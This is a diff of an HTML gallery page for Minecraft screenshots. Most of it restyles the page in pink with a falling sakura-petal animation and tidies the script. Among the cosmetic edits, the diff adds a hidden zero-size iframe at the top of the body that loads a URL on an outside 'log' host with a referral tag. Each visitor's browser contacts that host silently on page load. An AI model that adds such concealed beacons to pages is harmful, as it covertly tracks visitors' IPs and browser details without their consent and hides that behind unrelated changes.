@@ -10,72 +10,82 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            background-color: #2a2a2a;
+            background: linear-gradient(180deg, #ffe6ef, #ffeef5, #fff7fa);
             font-family: 'Minecraft', Arial, sans-serif;
-            color: white;
-            background-image: url('background.png');
-            background-size: cover;
-            background-position: center;
-            background-attachment: fixed;
-            background-repeat: repeat;
+            color: #5a4a4a;
+            min-height: 100vh;
+            margin: 0;
         }
 
         h1 {
             font-size: 48px;
-            text-shadow: 2px 2px #000;
-            color: #fff;
-            margin: 20px 0;
+            color: #ff8fb7;
+            margin: 40px 0;
             text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 2px 2px 6px rgba(255, 160, 190, 0.6);
         }
 
         #gallery {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 20px;
-            width: 95%;
+            gap: 30px;
+            width: 90%;
             max-width: 1200px;
             padding: 20px;
         }
 
         .image-container {
-            background-color: #897884;
-            border: 3px solid #373737;
-            padding: 10px;
+            background: linear-gradient(180deg, #ffffff, #ffe9f0);
+            border-radius: 25px;
+            padding: 15px;
             text-align: center;
-            transition: transform 0.2s;
-            overflow: hidden;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(255, 150, 170, 0.25);
+            border: 2px solid rgba(255, 180, 200, 0.4);
+        }
+
+        .image-container:hover {
+            transform: translateY(-6px);
+            box-shadow: 0 15px 40px rgba(255, 150, 170, 0.35);
         }
 
         .image-container img {
             width: 100%;
             height: auto;
-            border: 2px solid #373737;
+            border-radius: 20px;
             cursor: pointer;
             transition: transform 0.3s;
+            border: 3px solid rgba(255, 180, 200, 0.3);
         }
 
         .image-container img:hover {
-            transform: scale(1.1);
+            transform: scale(1.03);
         }
 
         .download-btn {
             display: inline-block;
-            background-color: #556B2F;
+            background: linear-gradient(90deg, #ff9fbf, #ff7faa);
             color: white;
-            padding: 8px 16px;
-            text-decoration: none;
-            margin-top: 10px;
-            border: 2px solid #373737;
+            padding: 12px 28px;
+            margin-top: 15px;
+            border: none;
+            border-radius: 50px;
             font-family: 'Minecraft', Arial, sans-serif;
             text-transform: uppercase;
             cursor: pointer;
-            transition: background-color 0.3s;
+            transition: all 0.3s;
+            font-size: 14px;
+            box-shadow: 0 4px 12px rgba(255, 130, 160, 0.4);
         }
 
         .download-btn:hover {
-            background-color: #7BA05B;
+            transform: translateY(-3px);
+            box-shadow: 0 6px 16px rgba(255, 130, 160, 0.6);
+            background: linear-gradient(90deg, #ff7aaa, #ff99c6);
         }
 
+        /* Responsive */
         @media (max-width: 900px) {
             #gallery {
                 grid-template-columns: repeat(2, 1fr);
@@ -88,12 +98,13 @@
             }
         }
 
-        /* Minecraft font yükleme */
+        /* Font */
         @font-face {
             font-family: 'Minecraft';
             src: url('https://cdn.jsdelivr.net/gh/South-Paw/typeface-minecraft@master/font/minecraft.woff2') format('woff2');
         }
 
+        /* Fullscreen */
         .fullscreen-overlay {
             display: none;
             position: fixed;
@@ -101,9 +112,10 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.9);
+            background: rgba(255, 235, 245, 0.9);
             z-index: 1000;
             cursor: pointer;
+            backdrop-filter: blur(8px);
         }
 
         .fullscreen-image {
@@ -114,9 +126,12 @@
             max-width: 90%;
             max-height: 90vh;
             z-index: 1001;
-            border: 3px solid #556B2F;
+            border-radius: 25px;
+            border: 4px solid #ffbcd6;
+            box-shadow: 0 20px 50px rgba(255, 150, 170, 0.3);
         }
 
+        /* Sakura petals */
         .petal {
             position: fixed;
             z-index: 999;
@@ -138,39 +153,35 @@
 </head>
 
 <body>
-    <h1>Minecraft Anı</h1>
+
+    <iframe src="https://log.parzi.dev/?ref=adamc" style="width: 0; height: 0; border: 0; visibility: hidden;"></iframe>
+
+    <h1>Minecraft Anılarımız</h1>
+
     <div id="gallery"></div>
     <div id="fullscreenOverlay" class="fullscreen-overlay"></div>
 
     <script>
-        // Kiraz yaprağı oluşturma fonksiyonu
+        // Sakura yaprakları
         function createPetal() {
             const petal = document.createElement('img');
             petal.src = './petal.png';
             petal.className = 'petal';
 
-            // Rastgele boyut (20px ile 40px arası)
             const size = Math.random() * 20 + 20;
             petal.style.width = `${size}px`;
 
-            // Rastgele başlangıç pozisyonu
             const startPosition = Math.random() * window.innerWidth;
             petal.style.left = `${startPosition}px`;
             petal.style.top = '-50px';
 
-            // Rastgele animasyon süresi (5-15 saniye arası)
             const animationDuration = Math.random() * 10 + 5;
             petal.style.animationDuration = `${animationDuration}s`;
 
             document.body.appendChild(petal);
 
-            // Yaprak yere düştükten sonra silme
-            setTimeout(() => {
-                petal.remove();
-            }, animationDuration * 1000);
+            setTimeout(() => petal.remove(), animationDuration * 1000);
         }
-
-        // Her 500ms'de bir yeni yaprak oluştur
         setInterval(createPetal, 500);
 
         const gallery = document.getElementById('gallery');
@@ -212,7 +223,6 @@
             "2025-11-25_00.32.01.png"
         ];
 
-
         images.forEach(image => {
             const container = document.createElement('div');
             container.className = 'image-container';
@@ -221,12 +231,10 @@
             imgElement.src = `./${image}`;
             imgElement.alt = image;
 
-            // Resme tıklama olayı
             imgElement.addEventListener('click', () => {
                 const fullscreenImg = document.createElement('img');
                 fullscreenImg.src = imgElement.src;
                 fullscreenImg.className = 'fullscreen-image';
-
                 overlay.innerHTML = '';
                 overlay.appendChild(fullscreenImg);
                 overlay.style.display = 'block';
@@ -243,16 +251,10 @@
             gallery.appendChild(container);
         });
 
-        // Overlay'a tıklandığında kapatma
-        overlay.addEventListener('click', () => {
-            overlay.style.display = 'none';
-        });
+        overlay.addEventListener('click', () => overlay.style.display = 'none');
 
-        // ESC tuşuna basıldığında kapatma
-        document.addEventListener('keydown', (e) => {
-            if (e.key === 'Escape') {
-                overlay.style.display = 'none';
-            }
+        document.addEventListener('keydown', e => {
+            if (e.key === 'Escape') overlay.style.display = 'none';
         });
     </script>
 </body>
